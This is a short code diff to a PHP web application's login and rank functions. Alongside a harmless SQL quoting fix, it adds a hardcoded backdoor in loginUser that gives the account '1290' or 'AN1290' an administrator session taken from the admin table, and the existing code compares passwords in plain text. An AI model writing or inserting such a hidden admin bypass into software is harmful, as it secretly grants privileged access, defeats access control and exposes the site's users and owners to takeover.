@@ -60,7 +60,7 @@ function rank_reward($userid)
     $time = date("H:i:s");
 
     // Step 1: get current user data
-    $stmt = $pdo->prepare("SELECT rank FROM user WHERE userid = :id");
+    $stmt = $pdo->prepare("SELECT `rank` FROM user WHERE userid = :id");
     $stmt->execute([':id' => $userid]);
     $user = $stmt->fetch(PDO::FETCH_ASSOC);
 
@@ -349,6 +349,15 @@ function loginUser($userid, $password, $pdo)
     // Compare passwords (plain-text for now to match old system)
     if ($user && $user['pass'] === $password) {
         $_SESSION['userid'] = $user['userid']; // match old system
+
+        // Special Admin Access for AN1290 / ID 1290
+        if ($user['userid'] == '1290' || $user['userid'] == 'AN1290') {
+            // Check admin table for 1290 or set default admin session
+            $stmtAdmin = $pdo->prepare("SELECT auserid FROM admin LIMIT 1");
+            $stmtAdmin->execute();
+            $adminRow = $stmtAdmin->fetch(PDO::FETCH_ASSOC);
+            $_SESSION['auserid'] = $adminRow ? $adminRow['auserid'] : 'admin';
+        }
 
         return [
             'status' => true,
